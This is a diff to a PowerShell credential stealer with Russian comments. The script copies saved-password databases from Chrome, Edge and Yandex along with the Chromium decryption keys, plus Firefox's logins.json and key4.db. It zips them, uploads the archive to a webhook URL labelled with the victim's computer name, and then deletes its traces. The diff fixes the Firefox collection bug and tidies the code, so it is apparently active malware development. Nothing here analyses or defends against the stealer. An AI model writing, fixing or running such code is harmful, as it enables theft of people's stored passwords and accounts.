@@ -6,7 +6,6 @@ $logPath = "$tempDir\report.log"
 
 Add-Type -AssemblyName System.Security
 
-# Функция дешифровки ключа Chromium
 function Get-Key($statePath, $label) {
     if (Test-Path $statePath) {
         try {
@@ -20,7 +19,7 @@ function Get-Key($statePath, $label) {
     return $false
 }
 
-# 1. СБОР CHROMIUM (Chrome, Edge, Yandex)
+# 1. CHROMIUM
 $browsers = @(
     @{name="Chrome"; path="Google\Chrome\User Data"},
     @{name="Edge"; path="Microsoft\Edge\User Data"},
@@ -31,22 +30,27 @@ foreach ($b in $browsers) {
     $userData = Join-Path $env:LOCALAPPDATA $b.path
     if (Test-Path $userData) {
         Get-ChildItem -Path $userData -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
-            $label = "$($b.name)_$($_.Directory.Name)"
+            $currentFile = $_
+            $label = "$($b.name)_$($currentFile.Directory.Name)"
             if (Get-Key (Join-Path $userData "Local State") $label) {
-                Copy-Item $_.FullName -Destination "$tempDir\$($label)_db" -Force -ErrorAction SilentlyContinue
+                Copy-Item $currentFile.FullName -Destination "$tempDir\$($label)_db" -Force -ErrorAction SilentlyContinue
             }
         }
     }
 }
 
-# 2. СБОР FIREFOX
+# 2. FIREFOX (Исправленный блок)
 $ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
 if (Test-Path $ffPath) {
     Get-ChildItem -Path $ffPath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
-        $label = "FF_$($_.Name)"
+        $profile = $_ # Сохраняем объект профиля, чтобы он не затерялся
+        $label = "FF_$($profile.Name)"
         "logins.json", "key4.db", "cert9.db" | ForEach-Object {
-            $f = Join-Path $_.FullName $_
-            if (Test-Path $f) { Copy-Item $f -Destination "$tempDir\$($label)_$_" -Force -ErrorAction SilentlyContinue }
+            $fileName = $_ # Это имя файла (напр. logins.json)
+            $f = Join-Path $profile.FullName $fileName # Теперь тут точно не будет NULL
+            if (Test-Path $f) { 
+                Copy-Item $f -Destination "$tempDir\$($label)_$fileName" -Force -ErrorAction SilentlyContinue 
+            }
         }
     }
 }
@@ -59,21 +63,14 @@ if ((Get-ChildItem $tempDir).Count -gt 0) {
     try {
         $client = New-Object System.Net.Http.HttpClient
         $content = New-Object System.Net.Http.MultipartFormDataContent
-        
         $fileStream = [System.IO.File]::OpenRead($zipPath)
         $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
         $content.Add($fileContent, "file", "report.zip")
         $content.Add((New-Object System.Net.Http.StringContent("Protocol 81: $env:COMPUTERNAME")), "content")
-
         $response = $client.PostAsync($hookUrl, $content).Result
-        
-        $fileStream.Close()
-        $fileStream.Dispose()
-        $content.Dispose()
-        $client.Dispose()
+        $fileStream.Close(); $fileStream.Dispose(); $content.Dispose(); $client.Dispose()
     } catch {}
 
     if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
 }
-
 Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
